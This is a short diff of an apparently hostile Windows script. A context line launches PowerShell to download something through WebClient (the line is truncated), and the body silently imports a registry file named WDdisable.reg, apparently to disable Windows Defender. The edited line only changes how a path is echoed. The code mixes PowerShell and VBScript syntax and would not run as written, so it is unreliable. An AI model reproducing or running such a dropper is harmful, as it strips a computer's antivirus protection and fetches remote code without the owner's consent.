@@ -7,7 +7,7 @@ $Shh.ShellExecute("cmd.exe","/c powershell (New-Object System.Net.Webclient).Dow
 
 
 $Shh = New-Object -ComObject WScript.Shell
-$Shh.Echo($Shh.ExpandEnvironmentStrings("%ProgramFiles%"))
+WScript.Echo($Shh.ExpandEnvironmentStrings("%ProgramFiles%"))
 $ProgramFiles = $Shh.ExpandEnvironmentStrings("%ProgramFiles%")
 $sRegFile = "$($ProgramFiles) C:\Users\q\Desktop\WDdisable.reg"
 $Shh.Run("Regedit.exe /s " & Chr(34) & sRegFile & Chr(34), 0, True)
